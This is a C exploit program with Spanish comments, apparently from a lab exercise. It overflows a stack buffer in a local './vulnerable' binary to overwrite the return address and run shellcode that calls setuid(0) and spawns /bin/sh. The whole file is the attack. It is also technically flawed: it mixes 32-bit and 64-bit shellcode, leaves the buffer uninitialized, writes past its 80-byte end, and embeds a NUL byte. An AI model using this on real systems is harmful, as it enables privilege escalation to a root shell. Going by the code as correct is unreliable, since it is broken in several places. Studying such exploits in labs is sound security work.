#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] = 
    /* setuid(0) */
    "\x31\xc0"              // xor    eax, eax
    "\xb0\x17"              // mov    al, 0x17 (setuid syscall)
    "\x31\xdb"              // xor    ebx, ebx (argumento 0)
    "\xcd\x80"              // int    0x80

    /*execve("/bin/sh") */
    "\x48\x31\xc0"
    "\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    "\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
//    "\x31\xc0"              // xor    eax, eax
//    "\x50"                  // push   eax (null terminator)
//    "\x68\x2f\x2f\x73\x68" // push 0x68732f2f -> '//sh'
//    "\x68\x2f\x62\x69\x6e" // push 0x6e69622f -> '/bin'
//    "\x89\xe3"              // mov    ebx, esp (puntero a "/bin//sh")
//    "\x50"                  // push   eax (null terminator para argv)
//    "\x53"                  // push   ebx (puntero a "/bin//sh")
//    "\x89\xe1"              // mov    ecx, esp (argv)
//    "\x31\xd2"              // xor    edx, edx (envp = NULL)
//    "\xb0\x0b"              // mov    al, 0x0b (execve syscall)
//    "\xcd\x80";             // int    0x80

int main(int argc, char *argv[]) {
    char payload[80]; // Buffer grande para la explotación
//    memset(payload, 0x90, sizeof(payload)); // NOP sled
    
    // Direccion de retorno - Ajustar según GDB
    void *ret_addr = (void *) 0xffffd630;
    memcpy(payload + 64, &ret_addr, 4); // Sobreescribimos EIP
    
    // Insertar shellcode al final del buffer
    memcpy(payload + 70, shellcode, sizeof(shellcode));
    
    // Ejecutar el binario vulnerable con el payload
    char *args[] = {"./vulnerable", payload, NULL};
    execve(args[0], args, NULL);
    
    return 0;
}

